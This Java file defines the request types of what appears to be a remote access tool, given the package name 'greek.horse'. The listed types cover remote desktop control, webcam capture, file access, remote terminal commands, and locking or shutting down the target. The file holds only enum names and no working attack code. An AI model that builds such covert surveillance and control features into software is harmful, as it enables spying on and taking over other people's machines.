package greek.horse.models;

import java.io.Serializable;

public enum RequestFunctionType implements Serializable {


    NET_INFO,

    CHAT_START, CHAT_MESSAGE,

    RELEASE,

    DISCONNECT, TURN_OFF, LOCK, STOP,

    DESKTOP_START, DESKTOP_REFRESH, USER_INPUT, MONITOR_COUNT,

    WEBCAM_START, WEBCAM_REFRESH, WEBCAM_LIST,

    FILES,

    TERMINAL_START, TERMINAL_COMMAND
}
